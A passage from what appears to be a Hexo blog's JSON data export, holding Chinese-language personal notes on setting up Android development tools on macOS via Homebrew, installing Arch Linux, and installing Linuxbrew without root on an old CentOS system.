在Mac上配置Android开发环境\n\n在Mac上配置Android开发环境，通常是直接下载安装Android Studio并运行其中的配置，有太多的手工操作，需要多次确认。因此我选择使用Homebrew来安装对应的软件。\n\nHomebrew可以自动安装多个Mac相关软件，以命令行程序为主，而Homebrew Cask包负责安装Mac上的App应用，安装时可以直接搜索，不必去各个网站单独下载，并且可以通过`brew upgrade`进行统一更新，免去了逐一手动更新的痛苦，目前大部分开发相关的应用都可以直接安装，基本能够达到替换App Store。\n\n### 配置基本android开发环境包\n\n正如上文所述，使用Homebrew进行软件管理的目的，所有软件均不会从官网下载，而只通过命令行安装。\n\n```\nbrew install ant\nbrew install maven\nbrew install gradle\nbrew install android-sdk\nbrew install android-ndk\n```\n\n允许android命令来安装Android开发环境，关于所需的包，可以参考[知乎-Android SDk Manager里面到底哪些东西是必须下载的？](https://www.zhihu.com/question/31935836)\n\n#### 安装HAXM\n\n这是唯一一步需要sudo操作的安装\n```\nbrew cask install intel-haxm\n```\n\n### 安装Android Studio\n\n```\nbrew cask install android-studio\n```\n\n允许Android Studio后，记得配置Android SDK路径为/usr/local/opt/android-sdk\n\n###","slug":"Install-Android-with-Homebrew","published":1,"updated":"2020-09-07T02:31:06.565Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmp000hxrn5fnhb23q1","content":"<h2 id=\"在Mac上配置Android开发环境\"><a href=\"#在Mac上配置Android开发环境\" class=\"headerlink\" title=\"在Mac上配置Android开发环境\"></a>在Mac上配置Android开发环境</h2><p>在Mac上配置Android开发环境，通常是直接下载安装Android Studio并运行其中的配置，有太多的手工操作，需要多次确认。因此我选择使用Homebrew来安装对应的软件。</p>\n<p>Homebrew可以自动安装多个Mac相关软件，以命令行程序为主，而Homebrew Cask包负责安装Mac上的App应用，安装时可以直接搜索，不必去各个网站单独下载，并且可以通过<code>brew upgrade</code>进行统一更新，免去了逐一手动更新的痛苦，目前大部分开发相关的应用都可以直接安装，基本能够达到替换App Store。</p>\n<h3 id=\"配置基本android开发环境包\"><a href=\"#配置基本android开发环境包\" class=\"headerlink\" title=\"配置基本android开发环境包\"></a>配置基本android开发环境包</h3><p>正如上文所述，使用Homebrew进行软件管理的目的，所有软件均不会从官网下载，而只通过命令行安装。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install ant</span><br><span class=\"line\">brew install maven</span><br><span class=\"line\">brew install gradle</span><br><span class=\"line\">brew install android-sdk</span><br><span class=\"line\">brew install android-ndk</span><br></pre></td></tr></table></figure>\n\n<p>允许android命令来安装Android开发环境，关于所需的包，可以参考<a href=\"https://www.zhihu.com/question/31935836\">知乎-Android SDk Manager里面到底哪些东西是必须下载的？</a></p>\n<h4 id=\"安装HAXM\"><a href=\"#安装HAXM\" class=\"headerlink\" title=\"安装HAXM\"></a>安装HAXM</h4><p>这是唯一一步需要sudo操作的安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install intel-haxm</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Android-Studio\"><a href=\"#安装Android-Studio\" class=\"headerlink\" title=\"安装Android Studio\"></a>安装Android Studio</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install android-studio</span><br></pre></td></tr></table></figure>\n\n<p>允许Android Studio后，记得配置Android SDK路径为&#x2F;usr&#x2F;local&#x2F;opt&#x2F;android-sdk</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3>","excerpt":"","more":"<h2 id=\"在Mac上配置Android开发环境\"><a href=\"#在Mac上配置Android开发环境\" class=\"headerlink\" title=\"在Mac上配置Android开发环境\"></a>在Mac上配置Android开发环境</h2><p>在Mac上配置Android开发环境，通常是直接下载安装Android Studio并运行其中的配置，有太多的手工操作，需要多次确认。因此我选择使用Homebrew来安装对应的软件。</p>\n<p>Homebrew可以自动安装多个Mac相关软件，以命令行程序为主，而Homebrew Cask包负责安装Mac上的App应用，安装时可以直接搜索，不必去各个网站单独下载，并且可以通过<code>brew upgrade</code>进行统一更新，免去了逐一手动更新的痛苦，目前大部分开发相关的应用都可以直接安装，基本能够达到替换App Store。</p>\n<h3 id=\"配置基本android开发环境包\"><a href=\"#配置基本android开发环境包\" class=\"headerlink\" title=\"配置基本android开发环境包\"></a>配置基本android开发环境包</h3><p>正如上文所述，使用Homebrew进行软件管理的目的，所有软件均不会从官网下载，而只通过命令行安装。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install ant</span><br><span class=\"line\">brew install maven</span><br><span class=\"line\">brew install gradle</span><br><span class=\"line\">brew install android-sdk</span><br><span class=\"line\">brew install android-ndk</span><br></pre></td></tr></table></figure>\n\n<p>允许android命令来安装Android开发环境，关于所需的包，可以参考<a href=\"https://www.zhihu.com/question/31935836\">知乎-Android SDk Manager里面到底哪些东西是必须下载的？</a></p>\n<h4 id=\"安装HAXM\"><a href=\"#安装HAXM\" class=\"headerlink\" title=\"安装HAXM\"></a>安装HAXM</h4><p>这是唯一一步需要sudo操作的安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install intel-haxm</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装Android-Studio\"><a href=\"#安装Android-Studio\" class=\"headerlink\" title=\"安装Android Studio\"></a>安装Android Studio</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install android-studio</span><br></pre></td></tr></table></figure>\n\n<p>允许Android Studio后，记得配置Android SDK路径为&#x2F;usr&#x2F;local&#x2F;opt&#x2F;android-sdk</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3>"},{"title":"Arch Linux安装教程","date":"2014-11-22T22:29:33.000Z","_content":"\n## 缘起\n\n最早接触Arch Linux是在[@layerssss](https://github.com/layerssss/)推荐下使用的。相比于其他的Linux系统（之前曾经用Ubuntu、Backtrack/Kali Linux）而言，有以下的特点：\n\n- 软件版本较新：所有的软件都进行滚动更新，基本是最新版软件，而且有很多都直接是Git包。\n\n- 软件自定义安装：默认的系统是最精简的配置，不会有额外的东西。\n\n- 软件非常丰富：加上aur库，基本能够包含各种的软件了。\n\n这些优点也对应了一些缺点\n\n- 经常会出现最新软件依赖问题导致无法更新\n\n- 各种配置特别容易出错。\n\n## 安装过程\n\n之前安装过Kali Linux，但是因为添加了SSD硬盘，因此电脑的分区有所变化，需要将Windows安装到SSD上。之前的Kali Linux安装在机械硬盘上，分区分的也比较小，也就想趁此机会把分区调大一点，结果在调整/分区的时候直接出错，不得不重装。\n\n### 安装基本环境\n\n刻录一个Arch Linux启动U盘，然后引导进入后，主要参考[Wiki](https://wiki.archlinux.org/index.php/Beginners%27_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))来进行安装，安装步骤基本一致，需要注意的地方如下\n\n0. 通用恢复方案\n\n貌似Arch Linux的Grub2引导菜单中没有恢复模式（抱歉不知道另外一个是什么功能），一般情况下如果有问题可以通过Live CD/USB来启动，我一开始比较笨的方法就是启动Live CD后，然后arch-chroot到对应的路径，进行系统修改操作。也可以直接进恢复模式。\n\n1. Wifi连接\n\n安装过程中全程使用Wifi进行连接，直接使用`wifi-menu`进行每次的连接，但是安装完新系统后，还需要额外安装`dialog`和`wpa_supplicant`\n\n### 显卡驱动问题\n\n这是第一个大坑，因为我的笔记本显卡是9300M GS，目前已经[不再被官方支持](https://www.archlinux.org/news/nvidia-340xx-and-nvidia/)，需要安装nvidia-340xx包。这个修改是在10月份的才发生的，因此在对应的中文Wiki并没有修改过来，直接导致多次安装仍然出问题。\n\n安装的时候最好一开始就选择安装Nvidia的私有显卡驱动，而不安装Nouveau，虽然Wiki上有如何[切换Nouveau和Nvidia](https://wiki.archlinux.org/index.php/NVIDIA#Switching_between_NVIDIA_and_nouveau_drivers)，但是实际切换的时候没有成功。\n\n安装完毕后Xorg可以安装XTerm以测试Xorg和显卡驱动是否正常。\n\n### 分区挂载\n\nLive CD能够正常进行挂载NTFS分区，但是如果直接在Live CD中挂载后生成为fstab，则无法直接启动挂载\n\n需要安装[ntfs-3g](https://wiki.archlinux.org/index.php/NTFS-3G)，并利用其进行挂载，并手工修改对应的fstab文件\n\n### 字体渲染\n\nArch Linux的默认字体渲染极差，据说Linux上的字体渲染效果会好于Windows（显然不会好于MacType），但是需要相对复杂的调整，目前我也没有达到非常好的字体渲染效果。\n\n为了提升字体配置效果，首先要安装一些软件包，包括fontconfig-infinality。也有利用Ubuntu配置文件的一些包例如fontconfig-ubuntu-zh-cn（安装的时候密钥更新失败）。\n\n我的配置如下，Arch Linux默认没有生成字体配置文件，首先参考官方的[字体配置Wiki](https://wiki.archlinux.org/index.php/Font_Configuration_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29)，生成一个默认的配置文件。然后进入[在线字体配置](http://wenq.org/cloud/fcdesigner_local.html)选择一个合适的配置，我选择了DejaVu作为英文字体，文泉驿微米黑作为中文字体，\n\n## 总结\n\n以上是安装Archlinux的安装过程，记录了遇到的主要问题，希望再次安装Arch Linux时可以依靠这个来减少搜索的花费。当然，同时也仍然有很多问题没有解决。\n\n## 其他问题\n\n1. Arch Linux Wiki最近访问不稳定，时不时的无法访问。\n\n2. Arch Linux在时间较长后进入睡眠（或者休眠？）后会出现无法进入系统的情况。\n\n3. 字体渲染仍然要进一步优化。\n\n发现有一个网页[一条命令搞定Linux字体渲染——Ubuntu系发行版微软雅黑+宋体终极解决方案【原创推荐】 ](http://www.lulinux.com/archives/278)可以参考一下。\n\n## 更新\n\n#### [2015-01-03]\n\n更新系统时，遇到错误\n\n> 错误：无法准备事务处理 (无法满足依赖关系)\n> :: package-query: 要求 pacman<4.2\n\n后来参照文章[Archlinux 升级 pacman 时遇到的问题及其解决](http://www.cnblogs.com/ccpaging/p/4191592.html)解决\n","source":"_posts/Install-Arch-Linux.md","raw":"title: Arch Linux安装教程\ndate: 2014-11-22 22:29:33\ntags: [\"Linux\"]\n---\n\n## 缘起\n\n最早接触Arch Linux是在[@layerssss](https://github.com/layerssss/)推荐下使用的。相比于其他的Linux系统（之前曾经用Ubuntu、Backtrack/Kali Linux）而言，有以下的特点：\n\n- 软件版本较新：所有的软件都进行滚动更新，基本是最新版软件，而且有很多都直接是Git包。\n\n- 软件自定义安装：默认的系统是最精简的配置，不会有额外的东西。\n\n- 软件非常丰富：加上aur库，基本能够包含各种的软件了。\n\n这些优点也对应了一些缺点\n\n- 经常会出现最新软件依赖问题导致无法更新\n\n- 各种配置特别容易出错。\n\n## 安装过程\n\n之前安装过Kali Linux，但是因为添加了SSD硬盘，因此电脑的分区有所变化，需要将Windows安装到SSD上。之前的Kali Linux安装在机械硬盘上，分区分的也比较小，也就想趁此机会把分区调大一点，结果在调整/分区的时候直接出错，不得不重装。\n\n### 安装基本环境\n\n刻录一个Arch Linux启动U盘，然后引导进入后，主要参考[Wiki](https://wiki.archlinux.org/index.php/Beginners%27_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))来进行安装，安装步骤基本一致，需要注意的地方如下\n\n0. 通用恢复方案\n\n貌似Arch Linux的Grub2引导菜单中没有恢复模式（抱歉不知道另外一个是什么功能），一般情况下如果有问题可以通过Live CD/USB来启动，我一开始比较笨的方法就是启动Live CD后，然后arch-chroot到对应的路径，进行系统修改操作。也可以直接进恢复模式。\n\n1. Wifi连接\n\n安装过程中全程使用Wifi进行连接，直接使用`wifi-menu`进行每次的连接，但是安装完新系统后，还需要额外安装`dialog`和`wpa_supplicant`\n\n### 显卡驱动问题\n\n这是第一个大坑，因为我的笔记本显卡是9300M GS，目前已经[不再被官方支持](https://www.archlinux.org/news/nvidia-340xx-and-nvidia/)，需要安装nvidia-340xx包。这个修改是在10月份的才发生的，因此在对应的中文Wiki并没有修改过来，直接导致多次安装仍然出问题。\n\n安装的时候最好一开始就选择安装Nvidia的私有显卡驱动，而不安装Nouveau，虽然Wiki上有如何[切换Nouveau和Nvidia](https://wiki.archlinux.org/index.php/NVIDIA#Switching_between_NVIDIA_and_nouveau_drivers)，但是实际切换的时候没有成功。\n\n安装完毕后Xorg可以安装XTerm以测试Xorg和显卡驱动是否正常。\n\n### 分区挂载\n\nLive CD能够正常进行挂载NTFS分区，但是如果直接在Live CD中挂载后生成为fstab，则无法直接启动挂载\n\n需要安装[ntfs-3g](https://wiki.archlinux.org/index.php/NTFS-3G)，并利用其进行挂载，并手工修改对应的fstab文件\n\n### 字体渲染\n\nArch Linux的默认字体渲染极差，据说Linux上的字体渲染效果会好于Windows（显然不会好于MacType），但是需要相对复杂的调整，目前我也没有达到非常好的字体渲染效果。\n\n为了提升字体配置效果，首先要安装一些软件包，包括fontconfig-infinality。也有利用Ubuntu配置文件的一些包例如fontconfig-ubuntu-zh-cn（安装的时候密钥更新失败）。\n\n我的配置如下，Arch Linux默认没有生成字体配置文件，首先参考官方的[字体配置Wiki](https://wiki.archlinux.org/index.php/Font_Configuration_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29)，生成一个默认的配置文件。然后进入[在线字体配置](http://wenq.org/cloud/fcdesigner_local.html)选择一个合适的配置，我选择了DejaVu作为英文字体，文泉驿微米黑作为中文字体，\n\n## 总结\n\n以上是安装Archlinux的安装过程，记录了遇到的主要问题，希望再次安装Arch Linux时可以依靠这个来减少搜索的花费。当然，同时也仍然有很多问题没有解决。\n\n## 其他问题\n\n1. Arch Linux Wiki最近访问不稳定，时不时的无法访问。\n\n2. Arch Linux在时间较长后进入睡眠（或者休眠？）后会出现无法进入系统的情况。\n\n3. 字体渲染仍然要进一步优化。\n\n发现有一个网页[一条命令搞定Linux字体渲染——Ubuntu系发行版微软雅黑+宋体终极解决方案【原创推荐】 ](http://www.lulinux.com/archives/278)可以参考一下。\n\n## 更新\n\n#### [2015-01-03]\n\n更新系统时，遇到错误\n\n> 错误：无法准备事务处理 (无法满足依赖关系)\n> :: package-query: 要求 pacman<4.2\n\n后来参照文章[Archlinux 升级 pacman 时遇到的问题及其解决](http://www.cnblogs.com/ccpaging/p/4191592.html)解决\n","slug":"Install-Arch-Linux","published":1,"updated":"2020-09-07T02:31:06.567Z","comments":1,"layout":"post","photos":[],"_id":"clypxqmmq000ixrn56trvhddl","content":"<h2 id=\"缘起\"><a href=\"#缘起\" class=\"headerlink\" title=\"缘起\"></a>缘起</h2><p>最早接触Arch Linux是在<a href=\"https://github.com/layerssss/\">@layerssss</a>推荐下使用的。相比于其他的Linux系统（之前曾经用Ubuntu、Backtrack&#x2F;Kali Linux）而言，有以下的特点：</p>\n<ul>\n<li><p>软件版本较新：所有的软件都进行滚动更新，基本是最新版软件，而且有很多都直接是Git包。</p>\n</li>\n<li><p>软件自定义安装：默认的系统是最精简的配置，不会有额外的东西。</p>\n</li>\n<li><p>软件非常丰富：加上aur库，基本能够包含各种的软件了。</p>\n</li>\n</ul>\n<p>这些优点也对应了一些缺点</p>\n<ul>\n<li><p>经常会出现最新软件依赖问题导致无法更新</p>\n</li>\n<li><p>各种配置特别容易出错。</p>\n</li>\n</ul>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><p>之前安装过Kali Linux，但是因为添加了SSD硬盘，因此电脑的分区有所变化，需要将Windows安装到SSD上。之前的Kali Linux安装在机械硬盘上，分区分的也比较小，也就想趁此机会把分区调大一点，结果在调整&#x2F;分区的时候直接出错，不得不重装。</p>\n<h3 id=\"安装基本环境\"><a href=\"#安装基本环境\" class=\"headerlink\" title=\"安装基本环境\"></a>安装基本环境</h3><p>刻录一个Arch Linux启动U盘，然后引导进入后，主要参考<a href=\"https://wiki.archlinux.org/index.php/Beginners%27_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">Wiki</a>来进行安装，安装步骤基本一致，需要注意的地方如下</p>\n<ol start=\"0\">\n<li>通用恢复方案</li>\n</ol>\n<p>貌似Arch Linux的Grub2引导菜单中没有恢复模式（抱歉不知道另外一个是什么功能），一般情况下如果有问题可以通过Live CD&#x2F;USB来启动，我一开始比较笨的方法就是启动Live CD后，然后arch-chroot到对应的路径，进行系统修改操作。也可以直接进恢复模式。</p>\n<ol>\n<li>Wifi连接</li>\n</ol>\n<p>安装过程中全程使用Wifi进行连接，直接使用<code>wifi-menu</code>进行每次的连接，但是安装完新系统后，还需要额外安装<code>dialog</code>和<code>wpa_supplicant</code></p>\n<h3 id=\"显卡驱动问题\"><a href=\"#显卡驱动问题\" class=\"headerlink\" title=\"显卡驱动问题\"></a>显卡驱动问题</h3><p>这是第一个大坑，因为我的笔记本显卡是9300M GS，目前已经<a href=\"https://www.archlinux.org/news/nvidia-340xx-and-nvidia/\">不再被官方支持</a>，需要安装nvidia-340xx包。这个修改是在10月份的才发生的，因此在对应的中文Wiki并没有修改过来，直接导致多次安装仍然出问题。</p>\n<p>安装的时候最好一开始就选择安装Nvidia的私有显卡驱动，而不安装Nouveau，虽然Wiki上有如何<a href=\"https://wiki.archlinux.org/index.php/NVIDIA#Switching_between_NVIDIA_and_nouveau_drivers\">切换Nouveau和Nvidia</a>，但是实际切换的时候没有成功。</p>\n<p>安装完毕后Xorg可以安装XTerm以测试Xorg和显卡驱动是否正常。</p>\n<h3 id=\"分区挂载\"><a href=\"#分区挂载\" class=\"headerlink\" title=\"分区挂载\"></a>分区挂载</h3><p>Live CD能够正常进行挂载NTFS分区，但是如果直接在Live CD中挂载后生成为fstab，则无法直接启动挂载</p>\n<p>需要安装<a href=\"https://wiki.archlinux.org/index.php/NTFS-3G\">ntfs-3g</a>，并利用其进行挂载，并手工修改对应的fstab文件</p>\n<h3 id=\"字体渲染\"><a href=\"#字体渲染\" class=\"headerlink\" title=\"字体渲染\"></a>字体渲染</h3><p>Arch Linux的默认字体渲染极差，据说Linux上的字体渲染效果会好于Windows（显然不会好于MacType），但是需要相对复杂的调整，目前我也没有达到非常好的字体渲染效果。</p>\n<p>为了提升字体配置效果，首先要安装一些软件包，包括fontconfig-infinality。也有利用Ubuntu配置文件的一些包例如fontconfig-ubuntu-zh-cn（安装的时候密钥更新失败）。</p>\n<p>我的配置如下，Arch Linux默认没有生成字体配置文件，首先参考官方的<a href=\"https://wiki.archlinux.org/index.php/Font_Configuration_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29\">字体配置Wiki</a>，生成一个默认的配置文件。然后进入<a href=\"http://wenq.org/cloud/fcdesigner_local.html\">在线字体配置</a>选择一个合适的配置，我选择了DejaVu作为英文字体，文泉驿微米黑作为中文字体，</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>以上是安装Archlinux的安装过程，记录了遇到的主要问题，希望再次安装Arch Linux时可以依靠这个来减少搜索的花费。当然，同时也仍然有很多问题没有解决。</p>\n<h2 id=\"其他问题\"><a href=\"#其他问题\" class=\"headerlink\" title=\"其他问题\"></a>其他问题</h2><ol>\n<li><p>Arch Linux Wiki最近访问不稳定，时不时的无法访问。</p>\n</li>\n<li><p>Arch Linux在时间较长后进入睡眠（或者休眠？）后会出现无法进入系统的情况。</p>\n</li>\n<li><p>字体渲染仍然要进一步优化。</p>\n</li>\n</ol>\n<p>发现有一个网页<a href=\"http://www.lulinux.com/archives/278\">一条命令搞定Linux字体渲染——Ubuntu系发行版微软雅黑+宋体终极解决方案【原创推荐】 </a>可以参考一下。</p>\n<h2 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h2><h4 id=\"2015-01-03\"><a href=\"#2015-01-03\" class=\"headerlink\" title=\"[2015-01-03]\"></a>[2015-01-03]</h4><p>更新系统时，遇到错误</p>\n<blockquote>\n<p>错误：无法准备事务处理 (无法满足依赖关系)<br>:: package-query: 要求 pacman&lt;4.2</p>\n</blockquote>\n<p>后来参照文章<a href=\"http://www.cnblogs.com/ccpaging/p/4191592.html\">Archlinux 升级 pacman 时遇到的问题及其解决</a>解决</p>\n","excerpt":"","more":"<h2 id=\"缘起\"><a href=\"#缘起\" class=\"headerlink\" title=\"缘起\"></a>缘起</h2><p>最早接触Arch Linux是在<a href=\"https://github.com/layerssss/\">@layerssss</a>推荐下使用的。相比于其他的Linux系统（之前曾经用Ubuntu、Backtrack&#x2F;Kali Linux）而言，有以下的特点：</p>\n<ul>\n<li><p>软件版本较新：所有的软件都进行滚动更新，基本是最新版软件，而且有很多都直接是Git包。</p>\n</li>\n<li><p>软件自定义安装：默认的系统是最精简的配置，不会有额外的东西。</p>\n</li>\n<li><p>软件非常丰富：加上aur库，基本能够包含各种的软件了。</p>\n</li>\n</ul>\n<p>这些优点也对应了一些缺点</p>\n<ul>\n<li><p>经常会出现最新软件依赖问题导致无法更新</p>\n</li>\n<li><p>各种配置特别容易出错。</p>\n</li>\n</ul>\n<h2 id=\"安装过程\"><a href=\"#安装过程\" class=\"headerlink\" title=\"安装过程\"></a>安装过程</h2><p>之前安装过Kali Linux，但是因为添加了SSD硬盘，因此电脑的分区有所变化，需要将Windows安装到SSD上。之前的Kali Linux安装在机械硬盘上，分区分的也比较小，也就想趁此机会把分区调大一点，结果在调整&#x2F;分区的时候直接出错，不得不重装。</p>\n<h3 id=\"安装基本环境\"><a href=\"#安装基本环境\" class=\"headerlink\" title=\"安装基本环境\"></a>安装基本环境</h3><p>刻录一个Arch Linux启动U盘，然后引导进入后，主要参考<a href=\"https://wiki.archlinux.org/index.php/Beginners%27_guide_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">Wiki</a>来进行安装，安装步骤基本一致，需要注意的地方如下</p>\n<ol start=\"0\">\n<li>通用恢复方案</li>\n</ol>\n<p>貌似Arch Linux的Grub2引导菜单中没有恢复模式（抱歉不知道另外一个是什么功能），一般情况下如果有问题可以通过Live CD&#x2F;USB来启动，我一开始比较笨的方法就是启动Live CD后，然后arch-chroot到对应的路径，进行系统修改操作。也可以直接进恢复模式。</p>\n<ol>\n<li>Wifi连接</li>\n</ol>\n<p>安装过程中全程使用Wifi进行连接，直接使用<code>wifi-menu</code>进行每次的连接，但是安装完新系统后，还需要额外安装<code>dialog</code>和<code>wpa_supplicant</code></p>\n<h3 id=\"显卡驱动问题\"><a href=\"#显卡驱动问题\" class=\"headerlink\" title=\"显卡驱动问题\"></a>显卡驱动问题</h3><p>这是第一个大坑，因为我的笔记本显卡是9300M GS，目前已经<a href=\"https://www.archlinux.org/news/nvidia-340xx-and-nvidia/\">不再被官方支持</a>，需要安装nvidia-340xx包。这个修改是在10月份的才发生的，因此在对应的中文Wiki并没有修改过来，直接导致多次安装仍然出问题。</p>\n<p>安装的时候最好一开始就选择安装Nvidia的私有显卡驱动，而不安装Nouveau，虽然Wiki上有如何<a href=\"https://wiki.archlinux.org/index.php/NVIDIA#Switching_between_NVIDIA_and_nouveau_drivers\">切换Nouveau和Nvidia</a>，但是实际切换的时候没有成功。</p>\n<p>安装完毕后Xorg可以安装XTerm以测试Xorg和显卡驱动是否正常。</p>\n<h3 id=\"分区挂载\"><a href=\"#分区挂载\" class=\"headerlink\" title=\"分区挂载\"></a>分区挂载</h3><p>Live CD能够正常进行挂载NTFS分区，但是如果直接在Live CD中挂载后生成为fstab，则无法直接启动挂载</p>\n<p>需要安装<a href=\"https://wiki.archlinux.org/index.php/NTFS-3G\">ntfs-3g</a>，并利用其进行挂载，并手工修改对应的fstab文件</p>\n<h3 id=\"字体渲染\"><a href=\"#字体渲染\" class=\"headerlink\" title=\"字体渲染\"></a>字体渲染</h3><p>Arch Linux的默认字体渲染极差，据说Linux上的字体渲染效果会好于Windows（显然不会好于MacType），但是需要相对复杂的调整，目前我也没有达到非常好的字体渲染效果。</p>\n<p>为了提升字体配置效果，首先要安装一些软件包，包括fontconfig-infinality。也有利用Ubuntu配置文件的一些包例如fontconfig-ubuntu-zh-cn（安装的时候密钥更新失败）。</p>\n<p>我的配置如下，Arch Linux默认没有生成字体配置文件，首先参考官方的<a href=\"https://wiki.archlinux.org/index.php/Font_Configuration_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29\">字体配置Wiki</a>，生成一个默认的配置文件。然后进入<a href=\"http://wenq.org/cloud/fcdesigner_local.html\">在线字体配置</a>选择一个合适的配置，我选择了DejaVu作为英文字体，文泉驿微米黑作为中文字体，</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>以上是安装Archlinux的安装过程，记录了遇到的主要问题，希望再次安装Arch Linux时可以依靠这个来减少搜索的花费。当然，同时也仍然有很多问题没有解决。</p>\n<h2 id=\"其他问题\"><a href=\"#其他问题\" class=\"headerlink\" title=\"其他问题\"></a>其他问题</h2><ol>\n<li><p>Arch Linux Wiki最近访问不稳定，时不时的无法访问。</p>\n</li>\n<li><p>Arch Linux在时间较长后进入睡眠（或者休眠？）后会出现无法进入系统的情况。</p>\n</li>\n<li><p>字体渲染仍然要进一步优化。</p>\n</li>\n</ol>\n<p>发现有一个网页<a href=\"http://www.lulinux.com/archives/278\">一条命令搞定Linux字体渲染——Ubuntu系发行版微软雅黑+宋体终极解决方案【原创推荐】 </a>可以参考一下。</p>\n<h2 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h2><h4 id=\"2015-01-03\"><a href=\"#2015-01-03\" class=\"headerlink\" title=\"[2015-01-03]\"></a>[2015-01-03]</h4><p>更新系统时，遇到错误</p>\n<blockquote>\n<p>错误：无法准备事务处理 (无法满足依赖关系)<br>:: package-query: 要求 pacman&lt;4.2</p>\n</blockquote>\n<p>后来参照文章<a href=\"http://www.cnblogs.com/ccpaging/p/4191592.html\">Archlinux 升级 pacman 时遇到的问题及其解决</a>解决</p>\n"},{"title":"在无Root权限系统中安装Linuxbrew","date":"2016-01-12T02:37:25.000Z","_content":"\n---\n\n# 在无Root权限系统中安装Linuxbrew\n\n## Linuxbrew\n\nHomebrew是Mac系统下著名的软件安装管理系统，其特点是不需要root权限即可编译安装Linux下的各种软件，通过修改路径来优先使用安装的软件包。而Linuxbrew则是其Linux移植版本，同样可以在不需要root权限的情况下，在.linuxbrew下完整建立一个运行环境，并在环境变量里面优先使用。\n\n因为目前我使用的一个系统是Centos5.4版本，无root权限，gcc、python等版本均非常旧，而且无法自由安装软件提供工作效率，所以选择Linuxbrew来安装需要的软件。但是实际上整个安装过程也是非常艰难的。\n\n## 安装过程\n\n虽然Linuxbrew号称不需要root权限，但是实际安装的时候还是需要满足一定的条件，目前主要条件如下：\n\n>   * Ruby 1.8.6 or newer\n>   * GCC 4.2 or newer\n>   * Linux 2.6.16 or newer\n>   * 64-bit x86 or 32-bit ARM platform\n\n可惜现有的系统不满足前两个条件，意味着需要在没有root权限下实现这亮点。\n\n### Ruby依赖\n\nLinuxbrew是基于ruby的，而Centos5.7的ruby版本是1.8.5，仅仅相差了一个小版本号，却无法运行。因为没有root权限，所以选择采用[rvm](https://rvm.io/)升级安装ruby。\n\n默认rvm是编译安装的，但是显然当前版本没有安装必要的devel包，所以是无法编译成功的，看到安装过程中会首先去搜索precompiled binary，猜测可能有不需要编译的ruby版本提供，经过一番搜索，果然是可以的，运行`rvm list remote`可以看到支持当前系统的ruby预编译版本，就选择了一个最低版本ruby-1.9.3-p551，但是很不幸，应该是网络问题无法直接下载，需要手动从[下载链接](https://rvm_io.global.ssl.fastly.net/binaries/centos/5/x86_64/)进行下载。\n\n对于下载的包，运行`rvm mount -r ruby-1.9.3-p551.tar.bz2 --binary`加载，会自动把包内的文件释放出来，此时会提醒运行缺少libyaml，但是发现好像并不会引起其他问题。\n\n### Git依赖\n\n坑爹的是git也没有安装，第一想法当然是直接释放git的rpm包，但是运行的时候一直有错误提醒：\n\n>    $ git clone https://github.com/nvie/gitflow.git\n>    Cloning into gitflow...\n>    fatal: Unable to find remote helper for 'https'\n\n后得知是缺乏libcurl相关库，但是最初并不知道，因此选择重新编译git，官网提示需要如下库\n\n```\nsudo yum install curl-devel expat-devel gettext-devel openssl-devel perl-devel zlib-devel\n```\n\n自然是按照对应的依赖，然后下载解压对应的包，增加到include路径中，然后进行编译，但是事实证明这个过程非常艰难，最终没有编译成功，有兴趣的同学可以尝试下看看。\n\n幸运的从网上找到了一个[Centos rpm包库](http://vault.centos.org/5.4/os/x86_64/CentOS/)，然后根据需要的包名选择下载，s使用命令`rpm2cpio *.rpm | cpio -div`释放rpm包文件到了本地的~/usr目录下，并确认这些文件及so能够正常在环境变量里面\n\n```\nexport PATH=$PATH:~/usr/bin\nexport LD_LIBRARY_PATH=$LD_LIBRARY_PATH:~/usr/lib\nexport C_INCLUDE_PATH=$C_INCLUDE_PATH:~/usr/include\nexport CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:~/usr/include\n```\n\n随后编译git，并放入~/usr/bin下，能够正常运行git。\n\n### 